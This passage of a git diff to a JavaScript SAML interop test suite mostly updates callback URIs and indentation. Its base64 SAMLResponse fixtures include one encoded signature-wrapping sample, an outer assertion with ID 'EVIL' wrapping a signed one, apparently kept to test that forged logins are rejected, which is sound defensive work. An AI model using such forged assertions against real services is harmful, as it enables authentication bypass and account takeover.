GM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWw6QXV0aG5Db250ZXh0Pjwvc2FtbDpBdXRoblN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+PHNhbWw6QXR0cmlidXRlIE5hbWU9InVpZCIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDp1cmkiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPndvbG9za2k8L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0iZ2l2ZW5OYW1lIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+TWF0aWFzPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9InNuIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+V29sb3NraTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJjbiIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDp1cmkiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPk1hdGlhcyBXb2xvc2tpPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9Im1haWwiIE5hbWVGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphdHRybmFtZS1mb3JtYXQ6dXJpIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj5tYXRpYXN3QGdtYWlsLmNvbTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJlZHVQZXJzb25QcmluY2lwYWxOYW1lIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+d29sb3NraUBybmQuZmVpZGUubm88L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0iZWR1UGVyc29uVGFyZ2V0ZWRJRCIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDp1cmkiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPjFiMTI0NmQ3MjgxOTdiYjQ3ZDA5MzQyYWE0ZjZjM2Y0N2Y0ZTkyYWU8L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0idXJuOm9pZDowLjkuMjM0Mi4xOTIwMDMwMC4xMDAuMS4xIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+d29sb3NraTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJ1cm46b2lkOjIuNS40LjQyIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+TWF0aWFzPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PHNhbWw6QXR0cmlidXRlIE5hbWU9InVybjpvaWQ6Mi41LjQuNCIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDp1cmkiPjxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPldvbG9za2k8L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0idXJuOm9pZDoyLjUuNC4zIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+TWF0aWFzIFdvbG9za2k8L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0idXJuOm9pZDowLjkuMjM0Mi4xOTIwMDMwMC4xMDAuMS4zIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI+PHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+bWF0aWFzd0BnbWFpbC5jb208L3NhbWw6QXR0cmlidXRlVmFsdWU+PC9zYW1sOkF0dHJpYnV0ZT48c2FtbDpBdHRyaWJ1dGUgTmFtZT0idXJuOm9pZDoxLjMuNi4xLjQuMS41OTIzLjEuMS4xLjYiIE5hbWVGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphdHRybmFtZS1mb3JtYXQ6dXJpIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj53b2xvc2tpQHJuZC5mZWlkZS5ubzwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT48L3NhbWw6QXR0cmlidXRlPjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJ1cm46b2lkOjEuMy42LjEuNC4xLjU5MjMuMS4xLjEuMTAiIE5hbWVGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphdHRybmFtZS1mb3JtYXQ6dXJpIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4c2k6dHlwZT0ieHM6c3RyaW5nIj4xYjEyNDZkNzI4MTk3YmI0N2QwOTM0MmFhNGY2YzNmNDdmNGU5MmFlPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -53,7 +53,7 @@\ndescribe('interop', function () {\n \n     it('should validate response and not signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -95,7 +95,7 @@\ndescribe('interop', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-okta',\n+        uri: `${server.BASE_URL}/callback/samlp-okta`,\n         form: { SAMLResponse: 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbDJwOlJlc3BvbnNlIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9hdXRoMDE0NS5hdXRoMC5jb20iIElEPSJpZDgxMzIzMDI4Njg0Njg5ODM4OTkzODY4MzEiIElzc3VlSW5zdGFudD0iMjAxMy0wOC0wM1QyMTo1NDo0My45NDJaIiBWZXJzaW9uPSIyLjAiPjxzYW1sMjpJc3N1ZXIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5Ij5odHRwOi8vd3d3Lm9rdGEuY29tL2s3eGtocTBqVUhVUFFBWFZNVUFOPC9zYW1sMjpJc3N1ZXI+PHNhbWwycDpTdGF0dXMgeG1sbnM6c2FtbDJwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sMnA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9zYW1sMnA6U3RhdHVzPjxzYW1sMjpBc3NlcnRpb24geG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJpZDgxMzIzMDI4Njg1NDEwMTk3NTU0MTQxMjEiIElzc3VlSW5zdGFudD0iMjAxMy0wOC0wM1QyMTo1NDo0My45NDJaIiBWZXJzaW9uPSIyLjAiIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSI+PHNhbWwyOklzc3VlciBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPmh0dHA6Ly93d3cub2t0YS5jb20vazd4a2hxMGpVSFVQUUFYVk1VQU48L3NhbWwyOklzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbz48ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz48ZHM6UmVmZXJlbmNlIFVSST0iI2lkODEzMjMwMjg2ODU0MTAxOTc1NTQxNDEyMSI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI+PGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM+PGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8+PGRzOkRpZ2VzdFZhbHVlPjRHK3V2ZUttdGlCMUVrWTVCQXQrOGxtUXdqST08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+UTgwTjZGVXI1L1lQdEV6UmxSZE1vUHUrYkwwTXNzRHhOVVkreXh5a3pibXhzSTBqb0VvL1NtbVNnWnJEWVFLVGxsWmsvS2Z6Qk1QRlY5eUJINCttRXpDVTVFM3h1Q3M5OWpaemFmY3czSzhtSU1USnkxWUh4amMzNTlkMjdSNXM1MGk5dzVQSHN1c1JvdjBNalFJb0oydzQ4R3k0RW5ZYVZpcUJSM1VWRXFFPTwvZHM6U2lnbmF0dXJlVmFsdWU+PGRzOktleUluZm8+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJQ25UQ0NBZ2FnQXdJQkFnSUdBVUJHSHhxVU1BMEdDU3FHU0liM0RRRUJCUVVBTUlHUk1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhFakFRQmdOVkJBTU1DV3RzZFdkc1lXSnpNakVjTUJvR0NTcUdTSWIzRFFFSkFSWU4KYVc1bWIwQnZhM1JoTG1OdmJUQWVGdzB4TXpBNE1ETXlNVE00TXpoYUZ3MDBNekE0TURNeU1UTTVNemhhTUlHUk1Rc3dDUVlEVlFRRwpFd0pWVXpFVE1CRUdBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFCkNnd0VUMnQwWVRFVU1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhFakFRQmdOVkJBTU1DV3RzZFdkc1lXSnpNakVjTUJvR0NTcUcKU0liM0RRRUpBUllOYVc1bWIwQnZhM1JoTG1OdmJUQ0JuekFOQmdrcWhraUc5dzBCQVFFRkFBT0JqUUF3Z1lrQ2dZRUFzQ0I5bEpUSApxQjd2ZE01amVPSDg0Y1c4dTdJSFl2NC9PQVBZRjBmQlllOXdKeTE5Q2d5TTJPZ2lBU3VBY0l0bkg0V2hCK2lvMlpQd2IvWHdsN1V1CjRYbVVFMGwrbWtDTnVEWXA1ZlhUWnh3djVHNkh2a0F4WFppbzBSazlUMFZFVENyb3hncFM1THhRL28vb3dqUjM5Uzd4elJuajZkZFgKM01xMnlHakt5QmNDQXdFQUFUQU5CZ2txaGtpRzl3MEJBUVVGQUFPQmdRQUIxcUdOcVNOTExXcStSUGNQK3dPYVd0WXBKT0o4L01iWgpFV1dtOS9LS0hLWE02Si96Z1VVSVhaaTNjek1lTytZK1gxNFBSOGxHWG9BSGY1Yi9KYXZHOUZtRnZSbjRmR2E0NVZUVm8yR2ZNTjZLCmFJS0Ywb2JlQ2JZaS9RVWY4QitYaTF0U0lKbTFWQ0tSRTdubmxpUS9UekdhTnVsZ1dleVRiVmtHMC9YOExRPT08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvZHM6S2V5SW5mbz48L2RzOlNpZ25hdHVyZT48c2FtbDI6U3ViamVjdCB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+PHNhbWwyOk5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI+YWRtaW5Aa2x1Z2xhYnMuY29tPC9zYW1sMjpOYW1lSUQ+PHNhbWwyOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgTm90T25PckFmdGVyPSIyMDEzLTA4LTAzVDIxOjU5OjQzLjk0MloiIFJlY2lwaWVudD0iaHR0cHM6Ly9hdXRoMDE0NS5hdXRoMC5jb20iLz48L3NhbWwyOlN1YmplY3RDb25maXJtYXRpb24+PC9zYW1sMjpTdWJqZWN0PjxzYW1sMjpDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAxMy0wOC0wM1QyMTo0OTo0My45NDNaIiBOb3RPbk9yQWZ0ZXI9IjIwMTMtMDgtMDNUMjE6NTk6NDMuOTQyWiIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdWRpZW5jZVJlc3RyaWN0aW9uPjxzYW1sMjpBdWRpZW5jZT5odHRwczovL2F1dGgwMTQ1LmF1dGgwLmNvbTwvc2FtbDI6QXVkaWVuY2U+PC9zYW1sMjpBdWRpZW5jZVJlc3RyaWN0aW9uPjwvc2FtbDI6Q29uZGl0aW9ucz48c2FtbDI6QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDEzLTA4LTAzVDIxOjU0OjQzLjk0MloiIFNlc3Npb25JbmRleD0iaWQxMzc1NTY2ODgzOTQyLjY4NzYxMDQzNyIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdXRobkNvbnRleHQ+PHNhbWwyOkF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0PC9zYW1sMjpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWwyOkF1dGhuQ29udGV4dD48L3NhbWwyOkF1dGhuU3RhdGVtZW50PjxzYW1sMjpBdHRyaWJ1dGVTdGF0ZW1lbnQgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxzYW1sMjpBdHRyaWJ1dGUgTmFtZT0iUm9sZSIgTmFtZUZvcm1hdD0ibnMiPjxzYW1sMjpBdHRyaWJ1dGVWYWx1ZSB4bWxuczp4cz0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiIHhtbG5zOnhzaT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEtaW5zdGFuY2UiIHhzaTp0eXBlPSJ4czpzdHJpbmciPkFkbWluPC9zYW1sMjpBdHRyaWJ1dGVWYWx1ZT48L3NhbWwyOkF0dHJpYnV0ZT48L3NhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWwyOkFzc2VydGlvbj48L3NhbWwycDpSZXNwb25zZT4=' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -108,7 +108,7 @@\ndescribe('interop', function () {\n \n     it('should validate response and not signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -124,7 +124,7 @@\ndescribe('interop', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-okta',\n+        uri: `${server.BASE_URL}/callback/samlp-okta`,\n         form: { SAMLResponse: 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbDJwOlJlc3BvbnNlIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9hdXRoMDE0NS5hdXRoMC5jb20iIElEPSJpZDgxMzIzMDI4Njg0Njg5ODM4OTkzODY4MzEiIElzc3VlSW5zdGFudD0iMjAxMy0wOC0wM1QyMTo1NDo0My45NDJaIiBWZXJzaW9uPSIyLjAiPjxzYW1sMjpJc3N1ZXIgeG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5Ij5odHRwOi8vd3d3Lm9rdGEuY29tL2s3eGtocTBqVUhVUFFBWFZNVUFOPC9zYW1sMjpJc3N1ZXI+PHNhbWwycDpTdGF0dXMgeG1sbnM6c2FtbDJwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sMnA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9zYW1sMnA6U3RhdHVzPjxzYW1sMjpBc3NlcnRpb24geG1sbnM6c2FtbDI9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJFVklMIiBJc3N1ZUluc3RhbnQ9IjIwMTMtMDgtMDNUMjE6NTQ6NDMuOTQyWiIgVmVyc2lvbj0iMi4wIiB4bWxuczp4cz0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiPjxzYW1sMjpJc3N1ZXIgRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6bmFtZWlkLWZvcm1hdDplbnRpdHkiIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vd3d3Lm9rdGEuY29tL2s3eGtocTBqVUhVUFFBWFZNVUFOPC9zYW1sMjpJc3N1ZXI+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlNpZ25lZEluZm8+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI3JzYS1zaGExIi8+PGRzOlJlZmVyZW5jZSBVUkk9IiNpZDgxMzIzMDI4Njg1NDEwMTk3NTU0MTQxMjEiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjxlYzpJbmNsdXNpdmVOYW1lc3BhY2VzIHhtbG5zOmVjPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIFByZWZpeExpc3Q9InhzIi8+PC9kczpUcmFuc2Zvcm0+PC9kczpUcmFuc2Zvcm1zPjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjc2hhMSIvPjxkczpEaWdlc3RWYWx1ZT40Ryt1dmVLbXRpQjFFa1k1QkF0KzhsbVF3akk9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PHNhbWwyOkFzc2VydGlvbiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgSUQ9ImlkODEzMjMwMjg2ODU0MTAxOTc1NTQxNDEyMSIgSXNzdWVJbnN0YW50PSIyMDEzLTA4LTAzVDIxOjU0OjQzLjk0MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+aHR0cDovL3d3dy5va3RhLmNvbS9rN3hraHEwalVIVVBRQVhWTVVBTjwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+PGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQ4MTMyMzAyODY4NTQxMDE5NzU1NDE0MTIxIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiLz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIj48ZWM6SW5jbHVzaXZlTmFtZXNwYWNlcyB4bWxuczplYz0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiBQcmVmaXhMaXN0PSJ4cyIvPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI3NoYTEiLz48ZHM6RGlnZXN0VmFsdWU+NEcrdXZlS210aUIxRWtZNUJBdCs4bG1Rd2pJPTwvZHM6RGlnZXN0VmFsdWU+PC9kczpSZWZlcmVuY2U+PC9kczpTaWduZWRJbmZvPjxkczpTaWduYXR1cmVWYWx1ZT5RODBONkZVcjUvWVB0RXpSbFJkTW9QdStiTDBNc3NEeE5VWSt5eHlremJteHNJMGpvRW8vU21tU2dackRZUUtUbGxaay9LZnpCTVBGVjl5Qkg0K21FekNVNUUzeHVDczk5alp6YWZjdzNLOG1JTVRKeTFZSHhqYzM1OWQyN1I1czUwaTl3NVBIc3VzUm92ME1qUUlvSjJ3NDhHeTRFbllhVmlxQlIzVVZFcUU9PC9kczpTaWduYXR1cmVWYWx1ZT48ZHM6S2V5SW5mbz48ZHM6WDUwOURhdGE+PGRzOlg1MDlDZXJ0aWZpY2F0ZT5NSUlDblRDQ0FnYWdBd0lCQWdJR0FVQkdIeHFVTUEwR0NTcUdTSWIzRFFFQkJRVUFNSUdSTVFzd0NRWURWUVFHRXdKVlV6RVRNQkVHDQpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVDQpNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RWpBUUJnTlZCQU1NQ1d0c2RXZHNZV0p6TWpFY01Cb0dDU3FHU0liM0RRRUpBUllODQphVzVtYjBCdmEzUmhMbU52YlRBZUZ3MHhNekE0TURNeU1UTTRNemhhRncwME16QTRNRE15TVRNNU16aGFNSUdSTVFzd0NRWURWUVFHDQpFd0pWVXpFVE1CRUdBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFDQpDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RWpBUUJnTlZCQU1NQ1d0c2RXZHNZV0p6TWpFY01Cb0dDU3FHDQpTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQXNDQjlsSlRIDQpxQjd2ZE01amVPSDg0Y1c4dTdJSFl2NC9PQVBZRjBmQlllOXdKeTE5Q2d5TTJPZ2lBU3VBY0l0bkg0V2hCK2lvMlpQd2IvWHdsN1V1DQo0WG1VRTBsK21rQ051RFlwNWZYVFp4d3Y1RzZIdmtBeFhaaW8wUms5VDBWRVRDcm94Z3BTNUx4US9vL293alIzOVM3eHpSbmo2ZGRYDQozTXEyeUdqS3lCY0NBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBQjFxR05xU05MTFdxK1JQY1Ard09hV3RZcEpPSjgvTWJaDQpFV1dtOS9LS0hLWE02Si96Z1VVSVhaaTNjek1lTytZK1gxNFBSOGxHWG9BSGY1Yi9KYXZHOUZtRnZSbjRmR2E0NVZUVm8yR2ZN